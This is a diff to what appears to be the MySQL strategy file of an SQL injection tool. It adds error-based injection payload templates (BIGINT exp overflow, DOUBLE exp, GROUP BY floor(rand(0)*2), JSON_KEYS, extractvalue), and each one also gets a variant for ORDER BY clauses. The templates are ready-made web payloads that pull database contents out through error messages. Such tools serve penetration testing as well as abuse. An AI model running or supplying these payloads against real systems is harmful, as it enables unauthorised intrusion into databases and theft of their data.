@@ -26,7 +26,7 @@ select concat(
             order by r
             separator ${SEPARATOR_CELL_HEX}
         ),
-        ''
+        ${TRAIL_HEX}
     ),
     ${TRAIL_HEX}
 ) from (
@@ -183,9 +183,36 @@ as char)
             <method>
                 <name>BIGINT::exp</name>
                 <query>
+and !(select*from(
+    ${WINDOW}
+)x)-~0
+                </query>
+                <capacity>64</capacity>
+            </method>
+            <method>
+                <name>BIGINT::exp in Order By</name>
+                <query>
+1, (select 1 from(select !(select*from(
+    ${WINDOW}
+)x)-~0)x)
+                </query>
+                <capacity>64</capacity>
+            </method>
+            <method>
+                <name>DOUBLE::exp</name>
+                <query>
 and 1 = exp(~(select*from(
     ${WINDOW}
 )x))
+                </query>
+                <capacity>64</capacity>
+            </method>
+            <method>
+                <name>DOUBLE::exp in Order By</name>
+                <query>
+1, (select exp(~(select*from(
+    ${WINDOW}
+)x)))
                 </query>
                 <capacity>64</capacity>
             </method>
@@ -206,10 +233,36 @@ or exists(
                 <capacity>64</capacity>
             </method>
             <method>
+                <name>GROUPBY::floor_rand in Order By</name>
+                <query>
+1, (select 1 from (
+    select
+        count(*),
+        concat(
+            (${WINDOW}),
+            floor(rand(0)*2)
+        )
+    from information_schema.tables
+    group by 2
+)x)
+                </query>
+                <capacity>64</capacity>
+            </method>
+            <method>
                 <name>JSON::json_keys</name>
                 <query>
 /* Require FALSE statement, then OR */
 and 1=0 or 1 = (select JSON_KEYS(cast((select*from(
+    ${WINDOW}
+)x)as char)))
+                </query>
+                <capacity>64</capacity>
+            </method>
+            <method>
+                <name>JSON::json_keys in Order By</name>
+                <query>
+/* Require FALSE statement, then OR */
+1,(select JSON_KEYS(cast((select*from(
     ${WINDOW}
 )x)as char)))
                 </query>
@@ -221,6 +274,15 @@ and 1=0 or 1 = (select JSON_KEYS(cast((select*from(
 and 1 = extractvalue(0x0a,concat(0x0a,(
     ${WINDOW}
 )))
+                </query>
+                <capacity>99</capacity>
+            </method>
+            <method>
+                <name>XML::extractvalue in Order By</name>
+                <query>
+1, (select 1 from(select extractvalue(0x0a,concat(0x0a,(
+    ${WINDOW}
+))))x)
                 </query>
                 <capacity>99</capacity>
             </method>
